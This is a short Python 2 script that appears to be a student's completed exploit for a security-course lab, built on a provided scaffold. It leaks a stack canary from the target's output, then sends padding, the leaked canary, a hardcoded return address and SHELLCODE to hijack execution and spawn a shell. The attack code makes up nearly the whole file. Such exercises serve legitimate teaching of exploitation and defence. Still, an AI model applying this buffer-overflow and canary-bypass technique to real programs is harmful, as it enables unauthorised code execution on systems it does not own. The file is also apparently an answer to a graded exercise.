#!/usr/bin/env python2

from scaffold import *

### YOUR CODE STARTS HERE ###

# Example send:
#p.send('test\\x41\n')

# Example receive:
#assert p.recvline() == 'testA'

# HINT: the last line of your exploit should look something like:
#   p.send('A' * m + canary + 'B' * n + rip + SHELLCODE + '\n')
# where m, canary, n and rip are all values you must determine
# and you might need to add a '\x00' somewhere

p.send('A'*12 + '\\' + 'x'+ '\n')
obj= p.recv(20)
canary=obj[13:17]
p.send('\x00'+'A'*15 + canary + 'A'*8 + '\xe4\xf7\xff\xbf' + SHELLCODE + '\n')

### YOUR CODE  ENDS  HERE ###

returncode = p.end()

if returncode == -11: print "segmentation fault or stack canary!"
elif returncode != 0: print "return code", returncode
